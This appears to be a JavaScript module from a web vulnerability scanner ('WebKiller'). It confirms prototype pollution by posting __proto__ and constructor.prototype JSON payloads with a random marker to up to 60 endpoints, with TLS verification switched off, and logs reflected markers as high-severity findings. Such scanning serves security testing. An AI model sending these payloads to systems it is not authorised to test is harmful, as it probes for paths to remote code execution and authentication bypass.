const { BaseModule, ModuleResult } = require('./base');
const { pushInsecureTLS, popInsecureTLS } = require('../tls_guard');
const { endpointCandidates, postJson, dedupEndpoints } = require('./massassign_confirm');

// POST a __proto__ / constructor.prototype payload carrying a unique marker. If
// the merge is unsafe and the marker is reflected, prototype pollution is
// reachable (RCE in Node, auth/logic bypass depending on the sink).
class ProtoPollutionConfirm extends BaseModule {
  static moduleName = 'protopollution_confirm';
  static phase = 'P6d';
  static toolsNeeded = [];

  async execute() {
    const candidates = endpointCandidates(this.workspace, this.scope, true);
    if (!candidates.length) return new ModuleResult({ module: ProtoPollutionConfirm.moduleName, status: 'skipped', errors: ['No candidate endpoints'] });
    const ua = this.config.user_agent || 'WebKiller/3.0';
    const confirmed = [];
    pushInsecureTLS();
    try {
      for (const ep of candidates.slice(0, this.config.protopp_max_urls || 60)) {
        const token = Math.random().toString(36).slice(2, 10);
        const marker = `WKPP_${token}`;
        const payloads = [
          `{"__proto__":{"polluted":"${marker}"}}`,
          `{"constructor":{"prototype":{"polluted":"${marker}"}}}`,
        ];
        let hit = false;
        for (const body of payloads) {
          try {
            const text = await postJson(ep, body, ua);
            // Echo guard: a pollution SINK reflects the marker as a derived value;
            // an endpoint that just echoes the body returns the __proto__ key too.
            if (text.includes(marker) && !/"__proto__"|"constructor"/.test(text)) {
              confirmed.push({ name: 'Prototype pollution', severity: 'high', url: ep, evidence: { marker, note: 'attacker-controlled prototype property reflected — unsafe recursive merge' }, type: 'dast_confirmed', vuln_class: 'prototype_pollution', module: ProtoPollutionConfirm.moduleName });
              hit = true; break;
            }
          } catch { /* skip */ }
        }
        if (hit) continue;
      }
    } finally { popInsecureTLS(); }
    const out = dedupEndpoints(confirmed);
    if (out.length) { this.workspace.appendJsonl('confirmed.jsonl', out); this.workspace.appendJsonl('findings.jsonl', out); }
    return new ModuleResult({ module: ProtoPollutionConfirm.moduleName, items: out.map(c => c.url), records: out, toolUsed: 'proto-marker' });
  }
}
module.exports = ProtoPollutionConfirm;
